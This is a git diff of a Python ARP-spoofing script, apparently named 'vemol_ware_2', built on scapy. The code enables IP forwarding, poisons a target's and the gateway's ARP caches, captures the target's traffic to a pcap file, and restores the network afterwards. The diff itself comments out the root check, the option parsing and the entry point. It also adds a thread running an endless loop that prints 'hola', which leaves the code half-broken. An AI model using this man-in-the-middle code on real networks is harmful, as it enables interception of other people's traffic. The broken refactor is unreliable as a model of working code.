@@ -16,18 +16,18 @@ CONF_IFACE = 'eth0'
 
 
 class ARPSpoofing():
-    def __init__(self):
+    # def __init__(self):
         
-        if os.geteuid() != 0:
-            print ("[-] Run me as root")
-            sys.exit(1)
+    #     if os.geteuid() != 0:
+    #         print ("[-] Run me as root")
+    #         sys.exit(1)
 
-        # ------------ Main ------------
-        usage = 'Usage: %prog [-i interface] [-t target] host/s'
-        parser = OptionParser(usage)
-        parser.add_option('-i', dest='interface', help='Specify the interface to use')
-        parser.add_option('-t', dest='target', help='Comma separated list to hosts to ARP poison')
-        (self.options, self.args) = parser.parse_args()
+    #     # ------------ Main ------------
+    #     usage = 'Usage: %prog [-i interface] [-t target] host/s'
+    #     parser = OptionParser(usage)
+    #     parser.add_option('-i', dest='interface', help='Specify the interface to use')
+    #     parser.add_option('-t', dest='target', help='Comma separated list to hosts to ARP poison')
+    #     (self.options, self.args) = parser.parse_args()
 
     #Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
     #an ARP reply with MAC Address
@@ -65,49 +65,54 @@ class ARPSpoofing():
             print("[*] Stopped ARP poison attack. Restoring network")
             self.restore_network(gateway_mac, target_ip, target_mac)
     
-    def main(self):
+    def foo(self):
+        while True:
+            print('hola')
+    
+    def main(self, target_ip):
         print('[*] Enabling IP forwarding')
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
         print(f'[*] Gateway IP address: {GATEWAY_IP}')
-        print(f'[*] Target IP address: {self.options.target}')
+        print(f'[*] Target IP address: {target_ip}')
 
         gateway_mac = self.get_mac(GATEWAY_IP)
         if gateway_mac is None:
-            print("[!] Unable to get gateway MAC address. Exiting..")
+            print('[!] Unable to get gateway MAC address. Exiting..')
             sys.exit(0)
         else:
-            print(f"[*] Gateway MAC address: {gateway_mac}")
+            print(f'[*] Gateway MAC address: {gateway_mac}')
 
-        target_mac = self.get_mac(self.options.target)
+        target_mac = self.get_mac(target_ip)
         if target_mac is None:
-            print("[!] Unable to get target MAC address. Exiting..")
+            print('[!] Unable to get target MAC address. Exiting..')
             sys.exit(0)
         else:
-            print(f"[*] Target MAC address: {target_mac}")
+            print(f'[*] Target MAC address: {target_mac}')
 
         #ARP poison thread
         poison_thread = threading.Thread(
             target=self.arp_poison, 
-            args=(gateway_mac, self.options.target, target_mac)
+            args=(gateway_mac, target_ip, target_mac)
         )
         poison_thread.start()
 
+        foo_thread = threading.Thread(target=self.foo )
+        foo_thread.start()
+
         #Sniff traffic and write to file. Capture is filtered on target machine
         try:
-            sniff_filter = "ip host " + self.options.target
-            print(f"[*] Starting network capture. Packet Count: {100}. Filter: {sniff_filter}")
+            sniff_filter = 'ip host ' + target_ip
+            print(f'[*] Starting network capture. Packet Count: {100}. Filter: {sniff_filter}')
             packets = sniff(filter=sniff_filter, iface=CONF_IFACE)
-            wrpcap(self.options.target + "_capture.pcap", packets)
-            print(f"[*] Stopping network capture..Restoring network")
-            self.restore_network(gateway_mac, self.options.target, target_mac)
+            wrpcap(target_ip + '_capture.pcap', packets)
+            print(f'[*] Stopping network capture..Restoring network')
+            self.restore_network(gateway_mac, target_ip, target_mac)
         except KeyboardInterrupt:
-            print(f"[*] Stopping network capture..Restoring network")
-            self.restore_network(gateway_mac, self.options.target, target_mac)
+            print(f'[*] Stopping network capture..Restoring network')
+            self.restore_network(gateway_mac, target_ip, target_mac)
             sys.exit(0)
+   
 
-
-    
-
-if __name__ == '__main__':
-    vemol_ware_2 = ARPSpoofing()
-    vemol_ware_2.main()
+# if __name__ == '__main__':
+#     vemol_ware_2 = ARPSpoofing()
+#     vemol_ware_2.main(target_ip)
